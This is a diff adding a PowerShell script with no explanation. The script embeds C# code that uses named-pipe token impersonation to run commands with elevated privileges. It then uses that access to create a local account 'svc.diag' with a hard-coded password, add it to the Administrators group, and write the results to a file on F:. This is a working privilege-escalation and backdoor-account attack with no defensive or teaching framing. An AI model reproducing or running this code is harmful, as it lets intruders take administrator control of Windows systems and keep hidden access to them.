@@ -1,0 +1,17 @@
+Add-Type @"
+using System;using System.Runtime.InteropServices;using System.Diagnostics;using System.Threading;using System.IO.Pipes;
+public class M{
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool ImpersonateNamedPipeClient(IntPtr h);
+[DllImport("advapi32.dll")]static extern bool RevertToSelf();
+[DllImport("kernel32.dll")]static extern IntPtr GetCurrentThread();
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool OpenThreadToken(IntPtr t,uint d,bool o,out IntPtr k);
+[DllImport("advapi32.dll",SetLastError=true)]static extern bool DuplicateTokenEx(IntPtr h,uint a,IntPtr t,int i,int y,out IntPtr n);
+[DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]static extern bool CreateProcessWithTokenW(IntPtr t,uint f,string a,string c,uint g,IntPtr e,string d,ref S s,out P p);
+[DllImport("kernel32.dll")]static extern bool CloseHandle(IntPtr h);
+[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct S{public int cb;public string a,b,c;public int x,y,w,h,xc,yc,fa,fl;public short sw,r;public IntPtr p,i,o,e;}
+[StructLayout(LayoutKind.Sequential)]public struct P{public IntPtr a,b;public int pid,tid;}
+public static string R(string cmd){string n="sp"+new Random().Next(10000,99999);var v=new NamedPipeServerStream(n,PipeDirection.InOut,10);new Thread(()=>{try{Process.Start(new ProcessStartInfo("cmd.exe","/c echo x>\\\\\\\\.\\\\pipe\\\\"+n){WindowStyle=ProcessWindowStyle.Hidden,CreateNoWindow=true});}catch{}}).Start();v.WaitForConnection();ImpersonateNamedPipeClient(v.SafePipeHandle.DangerousGetHandle());IntPtr k;OpenThreadToken(GetCurrentThread(),42,false,out k);IntPtr d;DuplicateTokenEx(k,33554432,IntPtr.Zero,2,1,out d);RevertToSelf();v.Close();if(d==IntPtr.Zero)return"E:"+Marshal.GetLastWin32Error();S s=new S();s.cb=Marshal.SizeOf(s);P p;bool ok=CreateProcessWithTokenW(d,0,null,"cmd.exe /c "+cmd,134217728,IntPtr.Zero,null,ref s,out p);CloseHandle(d);CloseHandle(k);return ok?"OK:"+p.pid:"F:"+Marshal.GetLastWin32Error();}}
+"@
+[M]::R("whoami > F:\Database\mp.txt & net user svc.diag Sugiarto20@ /add /y >> F:\Database\mp.txt 2>&1 & net localgroup Administrators svc.diag /add >> F:\Database\mp.txt 2>&1")
+Start-Sleep 3
+Get-Content F:\Database\mp.txt -EA SilentlyContinue
